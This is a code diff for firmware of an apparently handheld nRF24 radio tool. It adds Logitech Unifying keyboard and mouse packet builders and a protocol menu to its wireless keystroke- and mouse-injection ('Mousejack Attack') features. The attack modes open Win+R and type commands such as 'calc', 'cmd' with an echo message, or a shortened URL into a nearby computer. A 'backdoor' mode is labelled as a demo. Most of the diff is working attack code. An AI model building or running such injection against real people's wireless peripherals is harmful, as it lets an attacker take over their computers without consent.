@@ -107,6 +107,57 @@ void drawPickHeader(const char *title) {
     tft.setCursor(10, 30);
 }
 
+// Logitech Unifying protocol helpers
+// Calculates checksum for Logitech Unifying packets
+uint8_t logitechChecksum(const uint8_t *payload, uint8_t len) {
+    uint8_t cksum = 0;
+    for (uint8_t i = 0; i < len - 1; i++) {
+        cksum += payload[i];
+    }
+    cksum = (cksum ^ 0xFF) + 1;
+    return cksum;
+}
+
+// Build a Logitech Unifying keyboard payload
+// Modifier keys: 0x01=Ctrl, 0x02=Shift, 0x04=Alt, 0x08=GUI(Win/Cmd)
+void buildLogitechKeystroke(uint8_t *payload, uint8_t mod, uint8_t key) {
+    // Logitech Unifying keyboard packet format (10 bytes):
+    // [00] Device frame type (0x00 for keyboard)
+    // [01] Modifier keys
+    // [02] Reserved (0x00)
+    // [03] Key code 1
+    // [04] Key code 2
+    // [05] Key code 3
+    // [06] Key code 4
+    // [07] Key code 5
+    // [08] Key code 6
+    // [09] Checksum
+    memset(payload, 0, 10);
+    payload[0] = 0x00; // Keyboard frame
+    payload[1] = mod;
+    payload[3] = key;
+    payload[9] = logitechChecksum(payload, 10);
+}
+
+// Build a Logitech Unifying mouse payload
+void buildLogitechMouse(uint8_t *payload, uint8_t buttons, int8_t dx, int8_t dy, int8_t wheel) {
+    // Logitech Unifying mouse packet format (7 bytes):
+    // [00] Device frame type (0xC2 for mouse)
+    // [01] Button state
+    // [02] X movement (signed)
+    // [03] Y movement (signed)
+    // [04] Scroll wheel (signed)
+    // [05] Reserved
+    // [06] Checksum
+    memset(payload, 0, 7);
+    payload[0] = 0xC2; // Mouse frame
+    payload[1] = buttons;
+    payload[2] = (uint8_t)dx;
+    payload[3] = (uint8_t)dy;
+    payload[4] = (uint8_t)wheel;
+    payload[6] = logitechChecksum(payload, 7);
+}
+
 // HID helpers
 bool asciiToHid(char c, uint8_t &mod, uint8_t &key) {
     mod = 0;
@@ -514,24 +565,72 @@ void configureTx(uint8_t channel, const uint8_t addr[5]) {
     NRFradio.openWritingPipe(addr);
 }
 
-void keyboardInject(const Target &t) {
-    configureTx(t.channel, t.addr);
-    String text = keyboard("", 64, "Text to inject:");
-    if (text == "\x1B" || text.length() == 0) return;
+// Protocol mode for injection
+enum InjectionProtocol {
+    PROTO_GENERIC_HID = 0,  // Generic 8-byte HID
+    PROTO_LOGITECH = 1      // Logitech Unifying protocol
+};
 
-    drawPickHeader("Keyboard Inject");
-        tft.printf("Addr %s\n", addrToString(t.addr).c_str());
-        tft.printf("Ch %u Typing...\n", t.channel);
-        tft.println("ESC to cancel");
+InjectionProtocol currentProtocol = PROTO_GENERIC_HID;
 
-        for (size_t i = 0; i < text.length() && !check(EscPress); ++i) {
-            uint8_t mod = 0, key = 0;
-        if (!asciiToHid(text[i], mod, key)) continue;
-
+void sendKeystroke(uint8_t mod, uint8_t key, InjectionProtocol proto) {
+    if (proto == PROTO_LOGITECH) {
+        // Logitech Unifying format
+        uint8_t pkt[10];
+        buildLogitechKeystroke(pkt, mod, key);
+        sendPayload(pkt, 10);
+        // Key release
+        buildLogitechKeystroke(pkt, 0, 0);
+        sendPayload(pkt, 10);
+    } else {
+        // Generic HID format
         uint8_t pkt[8] = {mod, 0, key, 0, 0, 0, 0, 0};
         sendPayload(pkt, sizeof(pkt));
         uint8_t rel[8] = {0};
         sendPayload(rel, sizeof(rel));
+    }
+}
+
+void keyboardInject(const Target &t) {
+    configureTx(t.channel, t.addr);
+
+    // Protocol selection
+    drawPickHeader("Select Protocol");
+    int protoIdx = 0;
+    const char *protos[] = {"Generic HID", "Logitech Unifying"};
+    int lastDraw = -1;
+    while (true) {
+        if (protoIdx != lastDraw) {
+            drawPickHeader("Select Protocol");
+            tft.setTextSize(FM);
+            tft.println("Target: " + addrToString(t.addr));
+            tft.println("");
+            for (int i = 0; i < 2; ++i) {
+                tft.print((i == protoIdx) ? ">" : " ");
+                tft.print(" ");
+                tft.println(protos[i]);
+            }
+            lastDraw = protoIdx;
+        }
+        if (check(NextPress)) { protoIdx = (protoIdx + 1) % 2; delay(120); }
+        if (check(PrevPress)) { protoIdx = (protoIdx + 1) % 2; delay(120); }
+        if (check(SelPress)) { currentProtocol = (InjectionProtocol)protoIdx; break; }
+        if (check(EscPress)) return;
+    }
+
+    String text = keyboard("", 64, "Text to inject:");
+    if (text == "\x1B" || text.length() == 0) return;
+
+    drawPickHeader("Keyboard Inject");
+    tft.printf("Addr %s\n", addrToString(t.addr).c_str());
+    tft.printf("Ch %u Mode: %s\n", t.channel, protos[currentProtocol]);
+    tft.println("Typing... ESC cancel");
+
+    for (size_t i = 0; i < text.length() && !check(EscPress); ++i) {
+        uint8_t mod = 0, key = 0;
+        if (!asciiToHid(text[i], mod, key)) continue;
+        sendKeystroke(mod, key, currentProtocol);
+        delay(15); // Inter-keystroke delay
     }
 
     tft.println("Done. Esc to exit");
@@ -540,6 +639,31 @@ void keyboardInject(const Target &t) {
 
 void mouseInject(const Target &t) {
     configureTx(t.channel, t.addr);
+
+    // Protocol selection
+    drawPickHeader("Select Protocol");
+    int protoIdx = 0;
+    const char *protos[] = {"Generic HID", "Logitech Unifying"};
+    int lastDraw = -1;
+    while (true) {
+        if (protoIdx != lastDraw) {
+            drawPickHeader("Select Protocol");
+            tft.setTextSize(FM);
+            tft.println("Target: " + addrToString(t.addr));
+            tft.println("");
+            for (int i = 0; i < 2; ++i) {
+                tft.print((i == protoIdx) ? ">" : " ");
+                tft.print(" ");
+                tft.println(protos[i]);
+            }
+            lastDraw = protoIdx;
+        }
+        if (check(NextPress)) { protoIdx = (protoIdx + 1) % 2; delay(120); }
+        if (check(PrevPress)) { protoIdx = (protoIdx + 1) % 2; delay(120); }
+        if (check(SelPress)) { currentProtocol = (InjectionProtocol)protoIdx; break; }
+        if (check(EscPress)) return;
+    }
+
     drawPickHeader("Mouse Inject");
     String dxStr = keyboard("5", 4, "Move X (-127..127)");
     String dyStr = keyboard("0", 4, "Move Y (-127..127)");
@@ -550,13 +674,26 @@ void mouseInject(const Target &t) {
     bool click = (clickStr.length() > 0 && (clickStr[0] == 'y' || clickStr[0] == 'Y'));
 
     uint8_t btn = click ? 0x01 : 0x00;
-    uint8_t pkt[8] = {btn, (uint8_t)dx, (uint8_t)dy, 0, 0, 0, 0, 0};
 
     tft.printf("Addr %s\n", addrToString(t.addr).c_str());
-    tft.printf("Ch %u Send mouse...\n", t.channel);
-    sendPayload(pkt, sizeof(pkt), 5);
-    uint8_t release[8] = {0};
-    sendPayload(release, sizeof(release), 3);
+    tft.printf("Ch %u Mode: %s\n", t.channel, protos[currentProtocol]);
+    tft.println("Sending mouse cmd...");
+
+    if (currentProtocol == PROTO_LOGITECH) {
+        // Logitech Unifying format
+        uint8_t pkt[7];
+        buildLogitechMouse(pkt, btn, (int8_t)dx, (int8_t)dy, 0);
+        sendPayload(pkt, 7, 5);
+        // Release
+        buildLogitechMouse(pkt, 0, 0, 0, 0);
+        sendPayload(pkt, 7, 3);
+    } else {
+        // Generic HID format
+        uint8_t pkt[8] = {btn, (uint8_t)dx, (uint8_t)dy, 0, 0, 0, 0, 0};
+        sendPayload(pkt, sizeof(pkt), 5);
+        uint8_t release[8] = {0};
+        sendPayload(release, sizeof(release), 3);
+    }
 
     tft.println("Done. Esc to exit");
     while (!check(EscPress)) delay(20);
@@ -753,6 +890,31 @@ void nrf_mousejack() {
 
     configureTx(target.channel, target.addr);
 
+    // Protocol selection first
+    drawPickHeader("Select Protocol");
+    int protoIdx = 0;
+    const char *protos[] = {"Generic HID", "Logitech Unifying"};
+    int lastDrawProto = -1;
+    while (true) {
+        if (protoIdx != lastDrawProto) {
+            drawPickHeader("Select Protocol");
+            tft.setTextSize(FM);
+            tft.println("Target: " + addrToString(target.addr));
+            tft.printf("Vendor: %s\n", target.vendor.c_str());
+            tft.println("");
+            for (int i = 0; i < 2; ++i) {
+                tft.print((i == protoIdx) ? ">" : " ");
+                tft.print(" ");
+                tft.println(protos[i]);
+            }
+            lastDrawProto = protoIdx;
+        }
+        if (check(NextPress)) { protoIdx = (protoIdx + 1) % 2; delay(120); }
+        if (check(PrevPress)) { protoIdx = (protoIdx + 1) % 2; delay(120); }
+        if (check(SelPress)) { currentProtocol = (InjectionProtocol)protoIdx; break; }
+        if (check(EscPress)) { NRFradio.powerDown(); return; }
+    }
+
     int modeIdx = 0;
     const int modeCount = 7;
     const char *modes[modeCount] = {
@@ -765,7 +927,7 @@ void nrf_mousejack() {
             drawPickHeader("Mousejack Attack");
             tft.setTextSize(FM);
             tft.printf("Target: %s\n", addrToString(target.addr).c_str());
-            tft.printf("CH: %u  [%s]\n", target.channel, target.vendor.c_str());
+            tft.printf("CH: %u Mode: %s\n", target.channel, protos[currentProtocol]);
             tft.println("---");
             for (int i = 0; i < modeCount; ++i) {
                 tft.print((i == modeIdx) ? ">" : " ");
@@ -785,128 +947,96 @@ void nrf_mousejack() {
             configureTx(target.channel, target.addr);
             drawPickHeader("Mousejack Attack");
             tft.printf("Target: %s\n", addrToString(target.addr).c_str());
-            tft.printf("CH: %u\n", target.channel);
+            tft.printf("CH: %u Proto: %s\n", target.channel, protos[currentProtocol]);
             tft.println("Executing...\n");
 
             if (modeIdx == 0) {
                 // Launch calculator
                 tft.println("Launching calculator...");
-                #ifdef _WIN32
                 String cmd = "calc";
-                #else
-                String cmd = "gnome-calculator";
-                #endif
 
-                // Win+R / Cmd+Space
-                uint8_t winR[] = {0x08, 0, 0x15, 0, 0, 0, 0, 0}; // GUI + R
-                sendPayload(winR, 8, 3);
-                delay(200);
-                uint8_t rel[] = {0, 0, 0, 0, 0, 0, 0, 0};
-                sendPayload(rel, 8, 2);
-                delay(300);
+                // Win+R (GUI modifier + R key)
+                sendKeystroke(0x08, 0x15, currentProtocol); // GUI + R
+                delay(400);
 
-                // Type "calc" or "gnome-calculator"
+                // Type "calc"
                 for (size_t i = 0; i < cmd.length() && !check(EscPress); ++i) {
                     uint8_t mod = 0, key = 0;
                     if (asciiToHid(cmd[i], mod, key)) {
-                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
-                        sendPayload(pkt, 8, 2);
-                        sendPayload(rel, 8, 2);
-                        delay(20);
+                        sendKeystroke(mod, key, currentProtocol);
+                        delay(25);
                     }
                 }
 
                 // Press Enter
-                uint8_t enter[] = {0, 0, 0x28, 0, 0, 0, 0, 0};
-                sendPayload(enter, 8, 3);
-                sendPayload(rel, 8, 2);
+                sendKeystroke(0, 0x28, currentProtocol);
 
             } else if (modeIdx == 1) {
                 // Open CMD/Terminal and show message
                 tft.println("Opening terminal...");
 
                 // Win+R
-                uint8_t winR[] = {0x08, 0, 0x15, 0, 0, 0, 0, 0};
-                sendPayload(winR, 8, 3);
-                delay(200);
-                uint8_t rel[] = {0, 0, 0, 0, 0, 0, 0, 0};
-                sendPayload(rel, 8, 2);
-                delay(300);
+                sendKeystroke(0x08, 0x15, currentProtocol);
+                delay(400);
 
                 // Type "cmd"
                 String cmd = "cmd";
                 for (size_t i = 0; i < cmd.length(); ++i) {
                     uint8_t mod = 0, key = 0;
                     if (asciiToHid(cmd[i], mod, key)) {
-                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
-                        sendPayload(pkt, 8, 2);
-                        sendPayload(rel, 8, 2);
-                        delay(20);
+                        sendKeystroke(mod, key, currentProtocol);
+                        delay(25);
                     }
                 }
 
                 // Press Enter
-                uint8_t enter[] = {0, 0, 0x28, 0, 0, 0, 0, 0};
-                sendPayload(enter, 8, 3);
-                sendPayload(rel, 8, 2);
-                delay(500);
+                sendKeystroke(0, 0x28, currentProtocol);
+                delay(600);
 
                 // Type message
                 String msg = "echo Mousejacked!";
                 for (size_t i = 0; i < msg.length(); ++i) {
                     uint8_t mod = 0, key = 0;
                     if (asciiToHid(msg[i], mod, key)) {
-                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
-                        sendPayload(pkt, 8, 2);
-                        sendPayload(rel, 8, 2);
-                        delay(20);
+                        sendKeystroke(mod, key, currentProtocol);
+                        delay(25);
                     }
                 }
 
-                sendPayload(enter, 8, 3);
-                sendPayload(rel, 8, 2);
+                // Press Enter
+                sendKeystroke(0, 0x28, currentProtocol);
 
             } else if (modeIdx == 2) {
                 // Rick roll - open browser with YouTube URL
                 tft.println("Opening Rick Roll...");
 
-                uint8_t winR[] = {0x08, 0, 0x15, 0, 0, 0, 0, 0};
-                sendPayload(winR, 8, 3);
-                delay(200);
-                uint8_t rel[] = {0, 0, 0, 0, 0, 0, 0, 0};
-                sendPayload(rel, 8, 2);
-                delay(300);
+                // Win+R
+                sendKeystroke(0x08, 0x15, currentProtocol);
+                delay(400);
 
                 String url = "https://bit.ly/3dQnvFH";
                 for (size_t i = 0; i < url.length(); ++i) {
                     uint8_t mod = 0, key = 0;
                     if (asciiToHid(url[i], mod, key)) {
-                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
-                        sendPayload(pkt, 8, 2);
-                        sendPayload(rel, 8, 2);
-                        delay(15);
+                        sendKeystroke(mod, key, currentProtocol);
+                        delay(20);
                     }
                 }
 
-                uint8_t enter[] = {0, 0, 0x28, 0, 0, 0, 0, 0};
-                sendPayload(enter, 8, 3);
-                sendPayload(rel, 8, 2);
+                // Press Enter
+                sendKeystroke(0, 0x28, currentProtocol);
 
             } else if (modeIdx == 3) {
-                // Persistent backdoor (creates scheduled task or startup item)
-                tft.println("Creating backdoor...");
-                tft.println("(Demo mode - not real)");
+                // Persistent backdoor demo
+                tft.println("Backdoor demo...");
+                tft.println("(Not real payload)");
 
-                // This is a demonstration payload - replace with actual pentesting payload if authorized
                 String msg = "echo Backdoor demo";
                 for (size_t i = 0; i < msg.length(); ++i) {
                     uint8_t mod = 0, key = 0;
                     if (asciiToHid(msg[i], mod, key)) {
-                        uint8_t pkt[] = {mod, 0, key, 0, 0, 0, 0, 0};
-                        sendPayload(pkt, 8, 2);
-                        uint8_t rel[] = {0, 0, 0, 0, 0, 0, 0, 0};
-                        sendPayload(rel, 8, 2);
-                        delay(20);
+                        sendKeystroke(mod, key, currentProtocol);
+                        delay(25);
                     }
                 }
 
